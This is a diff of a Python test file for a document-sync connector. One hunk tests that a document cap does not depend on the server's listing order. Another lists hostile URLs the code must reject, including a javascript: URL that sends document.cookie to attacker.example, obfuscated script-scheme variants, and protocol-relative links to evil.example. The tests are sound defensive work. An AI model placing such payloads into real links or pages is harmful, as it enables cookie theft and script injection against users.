@@ -149,17 +149,37 @@ def test_snapshot_respects_max_documents() -> None:
     assert tuple(item.external_id for item in snapshot.items) == ("a", "b")
 
 
-def test_snapshot_max_documents_bounds_the_fetch() -> None:
-    """The cap stops paging; it is not applied after fetching everything."""
-    page = [_doc(f"doc-{i:03d}") for i in range(100)]
-    client = _FakeClient(
-        pages=[page] * 5,
-        documents={},
-        config=_config(max_documents=5),
+def test_snapshot_max_documents_is_stable_across_server_listing_order() -> None:
+    """The retained subset must not depend on the server's listing order.
+
+    Bounding the *fetch* by the cap re-introduces exactly the dependence
+    that sorting removes: with ``max_documents=2`` a first page of
+    ``[d, c]`` stops paging and keeps ``("c", "d")``, while a reordered
+    first page of ``[a, b]`` keeps ``("a", "b")``. Those sets are disjoint,
+    so all four items flap in and out of ``pending_removal`` on alternate
+    syncs. ``_MAX_PAGINATED_DOCUMENTS`` - not the cap - bounds a runaway
+    server.
+    """
+    # Pages must be full (``_PAGE_SIZE``) for the loop to keep going.
+    filler = [_doc(f"z-{i:03d}") for i in range(98)]
+    pages = [[_doc("d"), _doc("c"), *filler], [_doc("a"), _doc("b")]]
+    reordered = [[_doc("a"), _doc("b"), *filler], [_doc("d"), _doc("c")]]
+    forward = _FakeClient(
+        pages=pages, documents={}, config=_config(max_documents=2)
     )
-    snapshot = fetch_outline_snapshot(client)
-    assert snapshot.expected_count == 5
-    assert len(client.list_calls) == 1
+    backward = _FakeClient(
+        pages=reordered, documents={}, config=_config(max_documents=2)
+    )
+
+    forward_ids = tuple(
+        item.external_id for item in fetch_outline_snapshot(forward).items
+    )
+    backward_ids = tuple(
+        item.external_id for item in fetch_outline_snapshot(backward).items
+    )
+    assert forward_ids == backward_ids == ("a", "b")
+    # Both orderings paged all the way to the end before truncating.
+    assert len(forward.list_calls) == len(backward.list_calls) == 2
 
 
 def test_snapshot_terminates_on_empty_page() -> None:
@@ -196,17 +216,40 @@ def test_snapshot_non_dict_entry_raises() -> None:
     "hostile_url",
     [
         "javascript:fetch('https://attacker.example/?c='+document.cookie)",
+        "JaVaScRiPt:alert(1)",
+        "java\tscript:alert(1)",
+        "\x01javascript:alert(1)",
         "data:text/html,<script>alert(1)</script>",
         "vbscript:msgbox(1)",
+        "//evil.example/x",
+        "/\\evil.example/x",
+        "\\\\evil.example\\x",
+    ],
+    ids=[
+        "javascript",
+        "mixed-case",
+        "embedded-tab",
+        "leading-control-char",
+        "data",
+        "vbscript",
+        "protocol-relative",
+        "backslash-authority-path",
+        "backslash-authority",
     ],
 )
 def test_fetch_outline_document_rejects_non_http_url(
     hostile_url: str,
 ) -> None:
-    """A hostile scheme from the server must never become a source URL.
+    """Only a literal ``http(s)://`` prefix may become a source URL.
 
     ``source_url`` is stored as ``Document.original_url`` and rendered as an
-    ``<a href>``; Jinja escapes quotes but not the scheme.
+    ``<a href>``; Jinja escapes quotes but not the scheme. The strict
+    prefix allowlist also covers the spellings browsers normalise before a
+    scheme check would see them - case, embedded control characters,
+    leading control characters. Outline additionally accepts an
+    instance-relative path, so the protocol-relative forms ``//host`` and
+    ``/\\host`` have to be excluded explicitly: they are an authority, not
+    a path, and were being concatenated onto the base URL.
     """
     item = RemoteSnapshotItem(
         external_id="doc-1", provider_revision="x", revision="a" * 64
